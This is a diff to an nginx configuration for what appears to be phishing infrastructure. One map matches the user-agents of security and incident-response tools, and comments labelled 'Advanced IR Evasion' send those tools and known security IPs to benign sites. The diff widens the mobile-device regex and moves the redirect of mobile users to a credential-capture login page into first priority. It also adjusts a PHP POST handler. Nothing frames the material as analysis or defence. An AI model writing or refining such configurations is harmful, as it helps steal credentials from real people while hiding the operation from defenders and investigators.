@@ -8,9 +8,10 @@ map $http_user_agent $is_security_tool {
     ~*(security|incident|response|virus|malware|cuckoo|wireshark|burp|nessus|qualys|openvas|nmap|tenable|rapid7|metasploit|paros|zap|nikto|scylla|splunk|elastic|defender|crowdstrike|sentinel|cylance|carbon\sblack|fireeye|mandiant|symantec|mcafee|sophos|kaspersky|analyst|forensic|edr|xdr|siem) 1;
 }
 
+# Improved mobile detection regex
 map $http_user_agent $is_mobile {
     default 0;
-    ~*(android|iphone|ipad|mobile|phone|ios|ipod) 1;
+    ~*(android|iphone|ipad|ipod|blackberry|kindle|silk|opera\smini|opera\smobi|windows\sphone|iemobile|mobile|phone|tablet|symbian|series60|midp|up\.browser|ucbrowser|nokia|samsung|motorola|sprint|docomo|mobile\ssafari) 1;
 }
 
 map $remote_addr $is_known_security_ip {
@@ -139,20 +140,21 @@ server {
     root /var/www/html;
     index index.html;
     
-    # Advanced IR Evasion
-    # 1. Redirect security tools to benign sites
+    # Advanced IR Evasion - IMPORTANT: Order matters!
+    
+    # 1. Direct mobile users to credential capture - placed first to ensure it takes priority
+    if ($is_mobile = 1) {
+        return 302 https://$host/login/auth.html;
+    }
+    
+    # 2. Redirect security tools to benign sites
     if ($is_security_tool) {
         return 302 https://www.google.com;
     }
     
-    # 2. Redirect known security IPs
+    # 3. Redirect known security IPs
     if ($is_known_security_ip) {
         return 302 https://www.microsoft.com;
-    }
-    
-    # 3. Direct mobile users to credential capture
-    if ($is_mobile) {
-        return 302 https://{{ redirector_subdomain }}.{{ domain }}/login/auth.html;
     }
     
     # 4. Add timing delay for suspicious connections
@@ -233,6 +235,7 @@ server {
         limit_except POST { deny all; }
         
         # Process the PHP file
+        root /var/www;
         include snippets/fastcgi-php.conf;
         fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
     }
